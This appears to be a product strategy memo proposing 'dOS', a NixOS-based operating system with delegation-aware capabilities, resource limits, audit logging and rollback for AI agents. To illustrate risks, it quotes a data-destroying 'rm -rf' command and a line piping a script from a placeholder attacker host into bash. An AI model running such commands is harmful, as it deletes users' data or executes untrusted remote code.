## Executive Summary

Dropbox faces structural competitive pressure: Microsoft bundles OneDrive into Windows, Apple bundles iCloud into macOS. These integrations are invisible to users and impossible to displace through product quality alone. The human desktop and traditional server markets are captured.

However, a massive greenfield opportunity exists: **no operating system is designed for agentic AI**. Every current OS assumes a human at the keyboard. As AI agents become the primary compute consumers, whoever builds the AI-native OS captures the next platform.

Dropbox should build **dOS** (Dropbox OS) - a Linux distribution designed from first principles for autonomous AI systems.

**Tagline:** *dOS - the operating system for AI agents.*

**Brand logic:**
- **d** = Dropbox (heritage, trust, sync expertise)
- **OS** = Operating System (platform, not application)
- **dOS** echoes **DOS** - the foundation that launched personal computing. dOS is the foundation for agent computing.

### Deep Dive: The Security Model Problem

Current OS security was designed in the 1970s for human users at terminals. It assumes:

1. **Users are identifiable humans** - You log in, you're responsible
2. **Permissions are coarse** - Read/write/execute on files, that's it
3. **Trust is binary** - Either you have access or you don't
4. **Escalation requires human judgment** - "Do you want to allow this?" with a dialog

None of these assumptions work for autonomous AI.

#### Problem 1: Who Is The Agent?

```
Traditional:
  Human → logs in as "andrew" → has andrew's permissions

AI Autonomy:
  Human → grants AI access → AI spawns sub-agent → sub-agent spawns tool
                            → tool spawns subprocess → subprocess accesses file

  Who is responsible? What permissions apply? OS has no idea.
```

The OS sees one user ("andrew") but there's actually a delegation chain. If the sub-sub-process does something bad, the OS can't trace accountability.

**dOS solution:** Every process has an agent identity with a delegation chain. The kernel tracks: "this process was spawned by agent X, which was spawned by agent Y, which was authorized by human Z."

#### Problem 2: No Capability Attenuation

```
Traditional:
  User has permissions P
  Process run by user inherits permissions P
  Subprocess inherits permissions P

  → Everything has full user access
```

If you run Claude Code as yourself, every subprocess Claude spawns has YOUR full permissions. Claude can't delegate a subset of its access to a subprocess.

**dOS solution:** Capability attenuation. Each delegation can only REDUCE capabilities, never expand them.

```
Human grants AI: {read: /home, write: /home/ai-workspace, net: [api.anthropic.com]}
AI spawns analyzer: {read: /home/ai-workspace/data}  # subset only
Analyzer spawns helper: {read: /home/ai-workspace/data/subset}  # further reduced

# Analyzer CANNOT grant helper more than analyzer has
# Helper CANNOT grant anything more than it has
```

#### Problem 3: All-or-Nothing Resource Access

```
Traditional:
  Process requests memory → gets it or fails
  Process requests CPU → scheduled fairly
  Process requests disk → writes until full

  No contracts, no limits, no coordination
```

An AI training job can OOM your system. An AI writing logs can fill your disk. An AI in a loop can peg your CPU. The OS doesn't know AI processes are different from background daemons.

**dOS solution:** Resource contracts declared upfront.

```
agent-run --ram-max 8G --cpu-max 200% --disk-max 10G --net-max 100MB/s task.sh

# Kernel enforces limits
# If task exceeds contract, it's paused and reported, not crashed
# User can review and approve expanded contract
```

#### Problem 4: No Semantic Understanding of Operations

```
Traditional:
  rm -rf /important → permitted if you have write access
  OS doesn't know this is dangerous

  curl http://evil.com | bash → permitted if you have net access
  OS doesn't know this is dangerous
```

The OS sees system calls, not intent. It can't distinguish "delete cache" from "delete documents" from "delete system files."

**dOS solution:** Semantic operation classification + human-defined policies.

```
Policy: "destructive operations on /home/documents require confirmation"
Policy: "network operations to unknown hosts require approval"
Policy: "operations modifying >100 files require approval"

# Kernel classifies operations and applies policies
# AI can work autonomously within policy bounds
# Anomalous operations pause for review
```

#### Problem 5: Audit Logs Designed for Forensics, Not Supervision

Current logs tell you what happened AFTER something goes wrong. You grep through syslog hoping to find clues.

For AI autonomy, you need:
- Real-time visibility into what AI is doing
- Structured queries ("what did the AI modify in the last hour?")
- Automatic anomaly detection ("this is unusual behavior")
- Replayable history ("show me exactly what happened")

**dOS solution:** Structured operation log as first-class OS feature.

```bash
# Traditional
grep -r "suspicious" /var/log/  # Good luck

# dOS
agent-log --role research-agent --last 1h --format json
agent-log --anomalies --severity high
agent-replay --session abc123 --from 14:30 --to 14:45
```

#### Problem 6: No Safe Experimentation

AI needs to try things. Experimentation on current OSes is dangerous because mistakes are permanent.

**dOS solution:** Speculative execution with commit/rollback.

```bash
# AI wants to try a reorganization
agent-speculate --name "try-new-layout"
  # All operations in this block are tentative
  mv photos/ media/photos/
  mv videos/ media/videos/
  update-config --media-path /media
agent-preview  # Show what would change
agent-commit   # Make permanent
# OR
agent-rollback  # Undo everything
```

AI can be bold because mistakes are free.

#### The Security Summary

| Current OS | dOS |
|------------|---------------|
| Users are humans | Agents are first-class with delegation chains |
| Permissions: rwx on files | Capabilities: fine-grained, attenuating |
| Resources: best-effort | Resources: contracted, enforced |

## Product Vision: dOS

### Design Principles

#### 1. Proof-Native Filesystem

Every file operation carries verification metadata. The kernel validates invariants at the syscall level.

```
# Traditional: hope the file isn't corrupted
cat data.json

# dOS: kernel verifies hash chain before read
cat data.json  # Fails if integrity violated
```

Agents can trust filesystem state without defensive programming.

#### 2. Commit-as-Primitive

No "save" operation. Every write is atomic and versioned. The filesystem IS version control.

```
# Traditional: overwrite, hope nothing goes wrong
echo "new content" > file.txt

# dOS: automatic atomic commit
echo "new content" > file.txt  # Creates version, previous recoverable
```

Every state is recoverable. Agents can be aggressive because rollback is free.

#### 3. First-Class Agent Coordination

The kernel understands agent roles and provides structured coordination primitives.

```
# Traditional: hope file locks work
flock file.txt agent1.sh

# dOS: semantic coordination
agent-claim --role worker --scope ./src task.sh
# Other agents see claim, kernel mediates conflicts
```

Built-in support for the patterns proven in ai_template: role-based ownership, issue-like coordination, commit-based communication.

#### 4. Resource Contracts

Agents declare resource needs. The scheduler optimizes for AI workloads.

```
# Traditional: process fights for resources
python train.py

# dOS: declared contract
agent-run --gpu 1 --ram 32G --burst-ok python train.py
# Scheduler knows to batch, defer, or provision
```

No more OOM kills during training. No more GPU contention. Agents negotiate resources explicitly.

#### 5. Capability-Based Security

Fine-grained capabilities replace coarse user/group permissions.

```
# Traditional: user "agent" can read/write /home/agent
# But what about agent-spawned subagents?

# dOS: explicit capability grants
agent-spawn --cap read:/data --cap write:/output --cap net:api.openai.com subtask.sh
# Subtask cannot exceed parent's grants
```

Security model designed for delegation chains, not human sudo patterns.

#### 6. Structured Logging as OS Primitive

Every agent operation is logged in structured format. Observability is not optional.

```
# Traditional: grep through /var/log/syslog
# dOS: query agent operations
agent-log --role worker --since 1h --format json
```

Debugging multi-agent systems requires understanding coordination, not just individual process output.

### Architecture

```
┌─────────────────────────────────────────────────────────┐
│                    Agent Applications                    │
│         (Claude Code, custom agents, workflows)          │
├─────────────────────────────────────────────────────────┤
│                   Agent Runtime Layer                    │
│    ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────┐ │
│    │  Role    │ │ Resource │ │ Capability│ │Structured│ │
│    │ Manager  │ │ Scheduler│ │  Enforcer │ │  Logger  │ │
│    └──────────┘ └──────────┘ └──────────┘ └──────────┘ │
├─────────────────────────────────────────────────────────┤
│                  Versioned Filesystem                    │
│         (Copy-on-write, content-addressed, sync-native)  │
├─────────────────────────────────────────────────────────┤
│                     Linux Kernel                         │
│              (Modified for agent primitives)             │
└─────────────────────────────────────────────────────────┘
```

### Base Distribution

**Recommendation: Fork NixOS**

| Option | Pros | Cons |
|--------|------|------|
| NixOS | Declarative, reproducible, atomic upgrades, rollback built-in | Nix language learning curve |
| Alpine | Minimal, fast, musl libc | Less ecosystem, harder customization |
| Debian | Stable, huge ecosystem | Heavy, not designed for immutability |

NixOS already embodies many AI-friendly principles:
- Declarative system configuration (agents can reason about state)
- Atomic upgrades with rollback (safe experimentation)
- Reproducible builds (verifiable agent environments)
- Generations (version control for entire system state)

We extend NixOS with agent-specific primitives, not replace it.
